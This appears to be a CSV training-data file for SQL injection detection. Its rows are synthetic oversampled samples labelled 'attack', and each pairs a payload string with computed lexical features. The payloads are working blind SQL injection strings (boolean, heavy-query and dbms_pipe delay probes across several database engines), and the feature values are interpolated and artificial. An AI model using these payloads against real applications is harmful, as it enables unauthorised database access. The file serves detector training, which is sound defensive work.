id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000117,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000280,0.05257371783452553,137.0117342389136,36.92959456651852,3.9909909997869297,46.98826576108642,21.0,50.0,19.023468477827162,0.34295149159208194,0.15327163762735718,0.3649324705413266,0.13884440023923428,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.023468477827162,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.011734238913581246,2.0,0.0,1.0,1.0,0.9882657610864188,0.011734238913581108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000118,attack,boolean,"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000289,0.6386715956715789,131.0,32.22964660413458,4.191937600946464,72.0,8.61482330206729,33.77035339586542,16.61482330206729,0.549618320610687,0.06576200993944496,0.2577889572203467,0.1268307122295213,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.38517669793271,1.0,0.0,2.61482330206729,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000119,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",nearest_attack_euclidean,R000219,1.0562879696518255,138.82029142191308,32.0,4.218371761846564,80.0,6.359417156173816,36.64058284382618,15.820291421913092,0.5763134930769644,0.04591290042322369,0.2638556021056447,0.1139180043941672,3.589854289043454,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.410145710956546,0.0,0.0,2.410145710956546,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.589854289043454,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.589854289043454
SMOTE_000120,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000270,0.206189415285037,134.5561077985727,30.911221559714537,3.9496888166840876,64.62144908199824,8.0,44.11221559714537,17.822443119429074,0.4804732038154479,0.05946160328270191,0.32764240767400876,0.1324227852278414,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.822443119429074,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000121,attack,boolean,"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000177,1.01503398490377,140.36904520916156,33.184522604580785,4.234297843482679,70.0,16.0,39.36904520916157,15.0,0.4987837740027909,0.1140077197720665,0.2803262689388303,0.10688223728631233,0.40773869770960824,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.5922613022903915,0.0,0.0,2.0,5.0,0.4077386977096084,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000122,attack,boolean,1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,nearest_attack_euclidean,R000141,0.04645786141461606,138.01834478925434,34.018344789254336,4.239685100863074,66.00611492975145,15.018344789254332,39.981655210745664,17.012229859502888,0.4782420137843002,0.10881161522655375,0.2896872560136052,0.12325911497554091,5.018344789254333,-1.1102230246251565e-16,0.006114929751444231,0.0,0.0,1.0,0.0,4.993885070248556,0.0,0.0,-2.220446049250313e-16,5.006114929751444,1.0,0.0,0.0,0.9938850702485559,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.006114929751444231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.006114929751444
SMOTE_000123,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000256,1.1512080312463253,140.0,34.0,3.6648773407261173,37.0,15.0,60.0,28.0,0.2642857142857143,0.10714285714285714,0.42857142857142855,0.2,0.37851084699352633,0.6214891530064736,2.0,0.0,0.0,1.0,0.0,13.0,1.0,2.0,1.0,9.0,0.37851084699352633,0.6214891530064736,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000124,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",nearest_attack_euclidean,R000083,1.0063247194200606,133.0,33.709551345587656,3.691536021607198,42.0,15.0,56.0,20.0,0.3157894736842105,0.11278195488721804,0.42105263157894735,0.15037593984962405,5.053931539216464,0.9460684607835365,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.23651711519588425,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000163,0.054525646874066705,136.0591459480924,29.047316758473926,3.800720526231341,40.08280432732937,16.0,52.0,27.976341620763037,0.2945815368477836,0.11759770884598048,0.3821925537494365,0.20562820055679942,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,10.0,1.976341620763038,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.988170810381519,0.011829189618481284,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000028,0.5470204049675946,137.89300901663407,32.0,4.199479819634121,69.0,16.0,37.89300901663405,15.0,0.500459821807333,0.11604865433213517,0.2746959104241552,0.10879561343637673,0.7767477458414861,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.223252254158514,0.0,0.0,2.0,5.0,0.7767477458414861,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000127,attack,boolean,"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000129,0.3341609510392805,132.14519649981554,35.14519649981554,3.81130636224555,43.0,21.0,53.0,15.145196499815539,0.325401945232851,0.1589172290672063,0.4010768162172349,0.11460400948270778,0.0,0.14519649981553828,2.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.0,0.0,0.14519649981553834,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,boolean,"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.04899100783349339,135.01785289971485,30.964294200570304,3.8259459576722703,39.01785289971485,16.0,52.0,28.0,0.28898223738412987,0.11850296043597836,0.3851346214169296,0.2073801807629621,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,2.0,2.0,1.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.017852899714848,0.9821471002851521,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000129,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000031,0.8603547811940792,140.67459467109677,30.0,3.9723654927446037,67.67459467109677,8.0,45.0,20.0,0.48106613024265776,0.056869465178886816,0.3198907416312384,0.14217366294721706,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.6745946710967754,0.32540532890322454,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000270,0.9271665846744993,133.76365982451634,30.46233431078338,3.95319277089316,67.76365982451634,8.0,41.0,17.0,0.506254999911178,0.05984787879864511,0.30672037884305614,0.12717674244712085,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000036,1.6845486584185811,133.67532588438698,27.382189412055283,3.262634155883696,38.58627294466341,13.0,65.23562117588943,16.85343176383415,0.28774425686921945,0.09731279806964095,0.48851061321340705,0.12643233184773248,0.0,3.999999999999999,0.0,0.0,0.0,1.6178105879447158,0.0,10.0,1.2356211758894313,0.0,-2.220446049250313e-16,1.6178105879447156,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000132,attack,boolean,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,nearest_attack_euclidean,R000072,0.4525551331980117,140.0,36.20434075678169,4.3518116700772955,63.0,18.0,39.0,20.0,0.45,0.12857142857142856,0.2785714285714286,0.14285714285714285,8.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,-2.220446049250313e-16,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000133,attack,boolean,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000151,0.28249434790029937,140.89315434957632,30.0,3.9680975362388247,67.89315434957633,8.0,45.0,20.0,0.4818743803201151,0.05678088982793259,0.3193925052821208,0.14195222456983148,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.893154349576331,0.10684565042366895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000134,attack,boolean,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",nearest_attack_euclidean,R000246,0.9377423735276657,140.46226216160792,29.84904864643169,4.111678953170071,75.8490486464317,10.0,35.07547567678415,19.53773783839208,0.5399523510912589,0.07119439606808109,0.24974291575136254,0.1391103370892975,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.5377378383920777,0.0,4.0,0.0,5.0,4.0,2.5377378383920774,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000065,0.22314066051713613,133.0836216384551,28.91637836154491,4.027538774707067,65.08362163845509,10.0,36.0,22.0,0.4890408636188388,0.07514104946781781,0.2705077780841441,0.1653103088291992,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0836216384550887,0.9163783615449113,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000136,attack,boolean,"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.19321122010858297,140.37059596306324,29.0,3.813012313585031,72.0,8.0,44.496476770450585,15.874119192612646,0.5130015170348063,0.05700016855942293,0.31692357145889066,0.11307474294688002,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.874119192612646,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000137,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000081,1.4163661962007714,140.06035805840693,39.5452685438052,4.025022718659831,45.06035805840693,23.0,53.48491048539827,18.515089514601733,0.32158267072610014,0.16424840603473365,0.3819993014814751,0.13216962175769106,3.0,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.515089514601733,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5150895146017338,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.515089514601734
SMOTE_000138,attack,boolean,"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,nearest_attack_euclidean,R000168,0.5152598890846777,141.36167358595924,31.680836792979616,4.195689981326585,74.15958160351019,8.84041839648981,38.68083679297962,19.680836792979616,0.5246936488230998,0.0625170621569667,0.2736055090197334,0.1391837800002001,0.0,3.999999999999999,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.8404183964898087,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.1595816035101918,0.8404183964898082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000139,attack,boolean,"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000281,0.13354953718735982,130.28751038446728,30.05750207689346,3.987880560506605,70.59748546174579,8.0,35.57502076893458,16.115004153786916,0.5420091095572521,0.06140740267374711,0.2729167998008627,0.12366668796813804,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.115004153786916,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000096,0.17509200303337563,137.17038309241073,32.88641127172619,4.2676574710316855,79.0567943641369,7.7728225434523734,35.22717745654762,15.113588728273813,0.5763462233360953,0.05670039748246556,0.2567862306210975,0.11016714856034159,0.0,3.9432056358630927,0.0,0.0,1.0,1.0,0.0,4.056794364136907,0.0,0.0,2.0567943641369064,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.9432056358630934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9432056358630936
SMOTE_000141,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000230,0.7610928608607552,140.0,30.2483271561079,4.103203535070511,67.0,18.0,36.0,19.0,0.4785714285714286,0.12857142857142856,0.2571428571428571,0.1357142857142857,0.24832715610790013,0.7516728438920997,2.0,0.0,1.0,2.0,0.0,4.0,0.0,5.0,4.0,5.0,0.2483271561079004,0.7516728438920997,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000146,0.6358605257007292,141.7194860264261,32.0,4.146544731276291,69.0,16.0,41.0,15.71948602642611,0.4868822027857656,0.1129002209358297,0.2893068161480636,0.11091076013034112,0.0,0.7194860264261096,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.7194860264261096,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000087,1.0212572196049325,140.20732787825614,37.170688486975465,4.36180793175617,61.54870485220706,17.378016365231595,40.65862302604908,20.621983634768405,0.4390454418935589,0.12397114434264503,0.2899250980949788,0.14705831566881733,4.0,3.999999999999999,0.7926721217438653,0.0,0.0,2.0,0.0,4.4146557565122695,0.4146557565122695,0.0,-2.220446049250313e-16,6.792672121743865,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.2073278782561347,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000144,attack,boolean,"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000248,0.00019552185134233762,136.00048841665466,29.00008140277578,3.8703378459305733,71.0,8.0,41.000325611103115,16.000162805551557,0.5220570278799461,0.058823327085064346,0.30147184434689217,0.11764780068809741,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.000081402775779,8.140277577911581e-05,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000237,0.16058845718083353,133.54503399830003,28.922138000242853,3.8696993803882433,64.54503399830003,8.0,45.0,16.0,0.48322273608392596,0.05991620451200858,0.33702865038004826,0.11983240902401715,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
